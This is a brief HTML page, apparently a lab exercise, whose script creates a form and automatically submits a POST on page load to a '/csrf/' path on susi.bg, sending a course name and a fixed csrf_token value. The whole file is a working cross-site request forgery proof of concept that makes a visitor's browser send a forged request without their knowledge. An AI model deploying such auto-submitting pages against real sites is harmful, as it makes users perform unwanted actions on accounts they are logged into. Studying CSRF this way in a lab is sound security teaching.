<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
<body>
<script>
    let form = document.createElement("form");
    form.action = "http://susi.bg/csrf/susi/index.php";
    form.method = "POST";

    let input1 = document.createElement("input");
    input1.name = "course";
    input1.value = "Алгебра";

    let input2 = document.createElement("input");
    input2.name = "csrf_token";
    input2.value = "0123456789012345678901234567890123456789";

    form.appendChild(input1);
    form.appendChild(input2);

    document.body.appendChild(form);
    form.submit();
</script>
</body>
</html>
